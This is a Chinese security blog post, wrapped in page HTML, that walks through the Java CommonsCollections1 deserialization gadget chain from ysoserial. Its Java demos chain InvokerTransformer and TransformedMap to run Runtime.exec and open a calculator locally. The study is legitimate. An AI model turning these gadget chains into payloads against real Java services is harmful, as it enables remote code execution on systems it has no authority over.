@@ -1,0 +1,736 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="yhy的个人博客">
+  <meta name="author" content="yhy">
+  <meta name="keywords" content="">
+  
+  <title>Java ysoserial学习之CommonsCollections1(二) - yhy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>YHY</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tools/">
+                <i class="iconfont icon-exp-fill"></i>
+                辅助工具
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java ysoserial学习之CommonsCollections1(二)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      yhy
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-11 20:30" pubdate>
+        2021年6月11日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      78
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java ysoserial学习之CommonsCollections1(二)</h1>
+            
+              <p class="note note-info">
+                
+                  本文首发于微信公众号：<a target="_blank" href="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" rel="nofollow noopener noopener">谁不想当剑仙</a></br></br>本文最后更新于：2021年6月15日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>  超长预警</p>
+</blockquote>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+<p>Apache Commons Collections 中提供了一个Transformer的类，这个接口的功能就是将一个对象转换为另外一个对象，CC链都依赖于此。</p>
+<p>本文CommonsCollections1利用链的限制条件：</p>
+<p>​    JDK版本：jdk1.8以前（8u71之后已修复不可利用）、Commons-Collections 3.1-3.2.1</p>
+<p>实验环境：</p>
+<p>​    JDK 1.7.0_80、Commons-Collections 3.2.1 </p>
+<h2 id="0x02-P牛简化的利用链Demo分析"><a href="#0x02-P牛简化的利用链Demo分析" class="headerlink" title="0x02 P牛简化的利用链Demo分析"></a>0x02 P牛简化的利用链Demo分析</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Ser;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonCollections1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),<br>        &#125;;<br><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>我们来逐行分析这个简单的Demo</p>
+<h3 id="2-1-Transformer-接口"><a href="#2-1-Transformer-接口" class="headerlink" title="2.1 Transformer 接口"></a>2.1 Transformer 接口</h3><p>Transformer是一个接口，它只有一个待实现的<code>transform</code>方法:</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.commons.collections;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span> </span>&#123;<br>    <span class="hljs-function">Object <span class="hljs-title">transform</span><span class="hljs-params">(Object var1)</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>疑问1: Java 中接口是不能实例化的，但是为啥可以这样写<code>Transformer[] transformers = new Transformer[]</code> ，P牛有在<strong>代码审计</strong>知识星球中回答：这里是<strong>实例化</strong>了一个<strong>数组</strong>，并不是实例化<code>Transformer</code>接口（大学学的知识都快忘完了）。</p>
+<p>所以第一行是创建了一个数组，数组的类型是 <code>Transformer</code>, 该数组中有两个元素：</p>
+<ul>
+<li><p>  <strong>new ConstantTransformer(Runtime.getRuntime())</strong></p>
+</li>
+<li><p>  <strong>new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[] {“/System/Applications/Calculator.app/Contents/MacOS/Calculator”})</strong></p>
+</li>
+</ul>
+<h3 id="2-2-ConstantTransformer-类"><a href="#2-2-ConstantTransformer-类" class="headerlink" title="2.2 ConstantTransformer 类"></a>2.2 ConstantTransformer 类</h3><p>ConstantTransformer 是实现了Transformer接口的一个类，并且也实现了<code>Serializable</code>接口，说明是可序列化的<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609202433.png" srcset="/img/loading.gif" lazyload alt="image-20210608115434960"></p>
+<p>它的过程就是在构造函数的时候传入一个对象，并在<code>transform</code>方法将这个对象再返回。</p>
+<h3 id="2-3-InvokerTransformer-类"><a href="#2-3-InvokerTransformer-类" class="headerlink" title="2.3 InvokerTransformer 类"></a>2.3 InvokerTransformer 类</h3><p>InvokerTransformer 也是实现了Transformer接口的一个类，有两个构造方法，也是实现了<code>Serializable</code>接口<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609202441.png" srcset="/img/loading.gif" lazyload alt="image-20210608204045987"></p>
+<p>这里P牛使用的是第二个构造方法，传入了方法名为执行命令的<code>exec</code>方法，参数类型为数组<code>new Class[]&#123;String.class&#125;</code>，执行的是打开计算器 <code>new Object[] &#123;&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;</code></p>
+<p>这里也实现了<code>transform</code>方法，</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(<span class="hljs-keyword">this</span>.iMethodName, <span class="hljs-keyword">this</span>.iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, <span class="hljs-keyword">this</span>.iArgs);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="hljs-keyword">this</span>.iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, var6);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>这里通过 <code>input.getClass();</code> 获取对象，然后通过 <code>cls.getMethod(this.iMethodName, this.iParamTypes);</code> 传入方法名、方法的的参数类型来调用对象的方法，之后通过 <code>method.invoke(input, this.iArgs);</code> 来执行该方法。这也就是前面<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=0&xtrack=1#rd">初探Java反序列化漏洞(二)</a>中说过的<strong>Java反射</strong>。</p>
+<p>从这里我们能看出，<code>InvokerTransformer</code>这个类调用<code>transform</code>可以执行任意方法，这点非常关键，是反序列化能执行任意代码的关键。尝试使用<code>InvokeTransformer</code>来执行命令。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609205307.png" srcset="/img/loading.gif" lazyload alt="image-20210609205257230"></p>
+<p>我们在这里可以尝试进行序列化与反序列化的利用</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> con.yhy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/6/9 20:47</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 使用 InvokerTransformer 来执行命令</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokerTransformerTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer invoker = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;<br>        );<br><span class="hljs-comment">//        invoker.transform(Runtime.getRuntime());</span><br>        <span class="hljs-comment">// 将invokerTransformer进行序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./invoker.bin&quot;</span>));<br>        outputStream.writeObject(invoker);<br>        outputStream.close();<br><br>        <span class="hljs-comment">// 模拟目标后端程序接受到的序列化后的数据</span><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./invoker.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        InvokerTransformer invokerTransformer1 = (InvokerTransformer) fin.readObject();<br>        invokerTransformer1.transform(Runtime.getRuntime());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210610213951.png" srcset="/img/loading.gif" lazyload alt="image-20210609212210440"></p>
+<p>虽然成功执行，但是单单利用<code>InvokeTransformer</code>类来进行反序列化漏洞的利用在实战中是条件极其苛刻的。</p>
+<p>1.目标得恰巧利用<code>InvokerTransformer</code>将反序列化后的数据进行转型。</p>
+<p>2.目标得在转型后，正好调用了<code>transform</code>，并且参数是攻击者可以控制的。</p>
+<p>这样是行不通的，所以这一步只能是利用链中的一条线路，需要继续寻找可以用的点。</p>
+<h3 id="2-4-ChainedTransformer-类"><a href="#2-4-ChainedTransformer-类" class="headerlink" title="2.4 ChainedTransformer 类"></a>2.4 ChainedTransformer 类</h3><p>这个同样是实现Transformer接口的一个类，也是实现了<code>Serializable</code>接口<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609202448.png" srcset="/img/loading.gif" lazyload alt="image-20210608210704229"></p>
+<p>只有个接收数组，数组中元素类型为<code>Transformer</code>的一个有参构造方法。这里实现的<code>transform</code>方法的作用是：遍历执行传入数组元素的<code>transform</code>方法，同时将上个元素的返回对象作为s下个元素<code>transform</code>方法中的参数。</p>
+<h3 id="2-5-TransformedMap-类"><a href="#2-5-TransformedMap-类" class="headerlink" title="2.5 TransformedMap 类"></a>2.5 TransformedMap 类</h3><p>TransformedMap 这个类是用来对 Map 进行某些变换用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Map transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);<br></code></pre></div></td></tr></table></figure>
+
+<p>通过<code>decorate</code>函数就可以将一个普通的 Map 转换为一个<code>TransformedMap</code>。第二个参数和第三个参数分别对应当key改变和value改变时需要做的操作，都是<code>Transformer</code>类型，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，按照如上代码生成<code>transformedMap</code>后，如果修改了其中的任意key或value，都会调用对应的<code>transform</code>方法去进行一些变换操作。</p>
+<p>动手实验一下，帮助理解</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> con.yhy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/6/8 21:25</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 当map 中的 key 变动时，输出一句话</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyUpdate</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object o)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;key update&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformedMapTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Transformer transformer = <span class="hljs-keyword">new</span> KeyUpdate();<br><br>        Map outerMap = TransformedMap.decorate(innerMap, transformer, <span class="hljs-keyword">null</span>);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>这里我通过实现了一个当 map 中的 key 变动时，输出一句话的功能。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609202500.png" srcset="/img/loading.gif" lazyload alt="image-20210608213206466"></p>
+<h2 id="0x03-梳理P牛简化后的利用链"><a href="#0x03-梳理P牛简化后的利用链" class="headerlink" title="0x03 梳理P牛简化后的利用链"></a>0x03 梳理P牛简化后的利用链</h2><p>经过上面的逐行分析，现在我们可以复述一下Demo的运行逻辑：通过创建了一个<code>ChainedTransformer</code>，向其中传入一个<code>Transformer</code>类型的数组，该数组中有两个元素：第一个是<code>ConstantTransformer</code>;第二个是<code>InvokerTransformer</code>。</p>
+<p>因为<code>TransformedMap.decorate()</code> 会在 map 中 key 或者 value 改变时，去执行时调用对应的<code>transformer</code>方法，而<code>ChainedTransformer</code>对象的 <code>transform</code>方法是遍历执行传入参数的<code>transform</code>方法。</p>
+<p>所以当 map 中 key 或者 value 改变时，第一个元素<code>ConstantTransformer</code>会调用<code>transform</code>方法返回当前环境的<code>Runtime</code>对象，然后将<code>Runtime</code>对象作为数组第二个元素的<code>transform</code>方法的参数，而<code>InvokerTransformer</code>的<code>transform</code>方法是通过反射执行传入对象的方法，也就是下面的一个过程。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> con.yhy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/6/8 22:00</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reflect</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Object input = Runtime.getRuntime(); 	<span class="hljs-comment">// 第一个数组元素的执行返回结果</span><br>        Class cls = input.getClass();<br>        Method method = cls.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;);<br>        method.invoke(input, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;); <span class="hljs-comment">// 反射执行命令</span><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>最后通过 <code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code> 时，触发<code>TransformedMap.decorate()</code>方法，执行上面一系列过程打开计算器，即执行命令。<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210609202508.png" srcset="/img/loading.gif" lazyload alt="image-20210608221034991"></p>
+<p>上述过程并没有反序列化相关的链，只是一个本地运行的Demo，方便学习CommonCollections利用链的执行流程。而在实际的反序列化漏洞中，我们需要将上面最终生成的outerMap对象变成一个序列化流。</p>
